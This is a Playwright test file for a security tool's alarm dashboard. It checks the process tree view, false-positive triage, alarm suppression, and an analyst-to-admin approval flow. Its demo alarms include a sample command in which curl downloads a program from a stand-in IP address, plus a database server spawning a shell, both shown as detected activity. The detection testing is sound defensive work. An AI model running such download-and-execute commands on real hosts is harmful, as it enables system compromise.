import AxeBuilder from "@axe-core/playwright";
import { expect, test } from "@playwright/test";

// Threat alarms (P14) on the demo: list, process tree, triage, suppress.
test.beforeEach(async ({ page }) => {
  await page.goto("/");
  await expect(page.getByRole("heading", { level: 1 })).toContainText("Alex");
});

test("an alarm shows its process tree and is triaged and suppressed", async ({ page }) => {
  await page.getByRole("link", { name: "Alarms", exact: true }).click();
  const badge = page.locator(".rail .rail__item").filter({ hasText: "Alarms" }).first().locator(".rail__count");
  await expect(badge).toHaveText(/\d/);
  const before = Number((await badge.textContent())?.replace("+", ""));
  const row = page.locator(".view tbody tr").filter({ hasText: "A database server started a shell" });
  await expect(row).toContainText("postgres → bash");
  await row.locator("td").nth(2).click();
  const inspector = page.locator(".inspector");
  const tree = inspector.getByRole("list", { name: /Process tree/ });
  await expect(tree.locator("li")).toHaveCount(2);
  await expect(tree.locator("li").last()).toContainText("/usr/bin/bash");
  await expect(tree.locator("li").first()).toContainText("postgres: checkpointer");

  // One step to a closing state, and it needs a note (triage v2).
  await inspector.locator(".panel-header__actions").getByRole("button", { name: /^Set state/ }).click();
  await page.getByRole("menuitem", { name: /^False positive/ }).click();
  const dialog = page.getByRole("dialog", { name: "False positive" });
  await dialog.getByRole("button", { name: "Mark as false positive: 1 alarm" }).click();
  await expect(dialog.getByRole("alert")).toContainText("note");
  await dialog.getByRole("textbox", { name: "Why (required)" }).fill("our backup job");
  await dialog.getByRole("button", { name: "Mark as false positive: 1 alarm" }).click();
  await expect(page.locator(".toast")).toContainText("1 changed");
  await expect(inspector.locator(".panel-header")).toContainText("False positive");
  // Closing an alarm that isn't the newest still lowers the menu count (#164).
  if (before < 99) await expect(badge).toHaveText(String(before - 1));
  // Then suppress it on this host, from the panel (screen 12).
  await inspector.getByRole("button", { name: "Suppress…" }).click();
  const form = page.getByRole("dialog", { name: "Suppress alarms like this" });
  await expect(form.getByRole("button", { name: "Suppress", exact: true })).toBeDisabled();
  await form.getByRole("textbox", { name: "Reason (required)" }).fill("our backup job");
  await form.getByRole("button", { name: "Suppress", exact: true }).click();
  await expect(page.locator(".toast").last()).toContainText("Suppressed · recorded in the audit log");

  await page.getByRole("link", { name: "Alarm suppressions" }).click();
  await expect(page.locator("#suppressions-active [data-id]").filter({ hasText: "/usr/bin/bash" })).toContainText("our backup job");
  expect((await new AxeBuilder({ page }).analyze()).violations).toEqual([]);
});

test("resolved alarms are hidden by default and counted in the empty state", async ({ page }) => {
  await page.goto("/alarms?q=nothing-matches-this");
  await expect(page.getByText("Nothing matches these filters")).toBeVisible();
});

test("typing in a row's suppress form never moves the table or opens the inspector", async ({ page }) => {
  await page.goto("/alarms");
  const row = page.locator(".view tbody tr").filter({ hasText: "A shell downloaded a program and ran it" });
  await row.getByRole("button", { name: "Suppress…" }).click();
  const form = page.getByRole("dialog", { name: "Suppress alarms like this" });
  // j, k, x and Enter are the table's keys; in the form they are text.
  await form.getByRole("textbox", { name: "Reason (required)" }).pressSequentially("jkx");
  await form.getByRole("textbox", { name: "Reason (required)" }).press("Enter");
  await expect(form.getByRole("textbox", { name: "Reason (required)" })).toHaveValue("jkx\n");
  expect((await new AxeBuilder({ page }).include("dialog").analyze()).violations).toEqual([]);
  await form.getByRole("button", { name: "Cancel" }).click();
  await expect(page.locator(".inspector .panel-header")).toHaveCount(0);
  // Focus returns to the button that opened the form, which names its alarm.
  await expect(row.getByRole("button", { name: "Suppress… A shell downloaded a program and ran it on " })).toBeFocused();
});

test("suppressing from the list with approval off closes the alarm and lists it as active", async ({ page }) => {
  await page.goto("/alarms");
  const row = page.locator(".view tbody tr").filter({ hasText: "A shell downloaded a program and ran it" });
  await row.getByRole("button", { name: "Suppress…" }).click();
  const form = page.getByRole("dialog", { name: "Suppress alarms like this" });
  await expect(form).toContainText("/usr/bin/curl, with any arguments");
  await form.getByRole("radio", { name: "This exact command" }).click();
  await expect(form).toContainText("/usr/bin/curl curl -o x https://203.0.113.9/x");
  await form.getByRole("combobox", { name: "Where" }).click();
  await page.getByRole("option", { name: "All hosts" }).click();
  await form.getByRole("radio", { name: "Until removed" }).click();
  await expect(form).not.toContainText("Someone who can approve");
  await form.getByRole("textbox", { name: "Reason (required)" }).fill("admin's install script");
  await form.getByRole("button", { name: "Suppress", exact: true }).click();
  // Closed as a false positive: it leaves the default (active) list.
  // (The demo keeps its data in memory, so this test never reloads.)
  await expect(page.locator(".view tbody tr").filter({ hasText: "A shell downloaded a program and ran it" })).toHaveCount(0);
  await page.getByRole("link", { name: "Alarm suppressions" }).click();
  const listed = page.locator("#suppressions-active [data-id]").filter({ hasText: "/usr/bin/curl" });
  await expect(listed).toContainText("admin's install script");
  await expect(listed).toContainText("Active");
});

test("with approval on, a request waits on its alarm, is withdrawn, asked again and approved by someone else", async ({ page }) => {
  await page.goto("/settings?tab=general");
  await page.getByRole("switch", { name: "Suppressions need approval" }).click();
  await expect(page.getByText("Saved · recorded in the audit log").first()).toBeVisible();
  const persona = async (name: string) => {
    await page.getByRole("button", { name: "Account" }).click();
    await page.getByRole("menuitemradio", { name, exact: true }).click();
  };
  await persona("analyst");
  await page.goto("/alarms");
  await page.locator(".view tbody tr").filter({ hasText: "A database server started a shell" }).locator("td").nth(2).click();
  const inspector = page.locator(".inspector");
  const ask = async () => {
    await inspector.getByRole("button", { name: "Suppress…" }).click();
    const form = page.getByRole("dialog", { name: "Suppress alarms like this" });
    await expect(form).toContainText("Someone who can approve on those hosts must accept it. Until then these alarms keep arriving.");
    await form.getByRole("textbox", { name: "Reason (required)" }).fill("nightly vacuum script");
    await form.getByRole("button", { name: "Request" }).click();
    await expect(inspector).toContainText("Suppression requested, waiting for approval… these alarms keep arriving");
  };
  await ask();
  await inspector.getByRole("button", { name: "Withdraw request" }).click();
  await expect(inspector.getByRole("button", { name: "Suppress…" })).toBeVisible();
  await ask();
  await expect(inspector.locator(".panel-header")).toContainText("Open");
  // The list (wide enough for its Suppress column) offers no second request for it.
  await page.goto("/alarms");
  const listRow = page.locator(".view tbody tr").filter({ hasText: "A database server started a shell" });
  await expect(listRow).toContainText("Requested");
  await expect(listRow.getByRole("button", { name: /^Suppress…/ })).toHaveCount(0);

  // An approver on the same hosts (the administrator) sees it waiting and approves.
  await persona("admin");
  await page.goto("/alarms");
  const theirs = page.locator(".view tbody tr").filter({ hasText: "A database server started a shell" });
  await expect(theirs).toContainText("Waiting for approval");
  await expect(theirs.getByRole("button", { name: /^Suppress…/ })).toHaveCount(0);
  await page.goto("/alarm-suppressions");
  await expect(page.locator("#suppressions-waiting [data-id]").filter({ hasText: "nightly vacuum script" })).toContainText("Waiting");
  await page.locator("#suppressions-waiting [data-id]").filter({ hasText: "nightly vacuum script" }).getByRole("button", { name: "Approve" }).click();
  await expect(page.locator("#suppressions-active [data-id]").filter({ hasText: "nightly vacuum script" })).toContainText("Active");
  await page.goto("/alarms");
  await expect(page.locator(".view tbody tr").filter({ hasText: "A database server started a shell" })).toHaveCount(0);
});

test("with alarms present, an empty filter result hints at the filters, not setup", async ({ page }) => {
  await page.goto("/alarms?q=no-such-alarm");
  await expect(page.getByText("clear a filter to see more")).toBeVisible();
  await expect(page.getByText("auditd")).toHaveCount(0);
});
